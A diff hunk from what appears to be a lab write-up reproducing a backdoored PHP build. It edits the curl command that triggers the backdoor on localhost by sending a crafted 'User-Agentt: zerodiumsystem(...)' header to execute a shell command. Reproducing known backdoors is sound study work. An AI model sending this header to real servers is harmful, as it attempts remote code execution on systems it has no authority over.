@@ -15,7 +15,7 @@ $ ./backdoored/sapi/cli/php -S 127.0.0.1:8080 -t ./www
 ```
 In a separate terminal, we can trigger the backdoor via a simple HTTP request:
 ```console
-$ curl -v -H "User-Agentt: zerodiumsystem('id')" http://localhost:8080
+$ curl -v -H "User-Agentt: zerodiumsystem('id');" http://localhost:8080
 * Host localhost:8080 was resolved.
 * IPv6: ::1
 * IPv4: 127.0.0.1
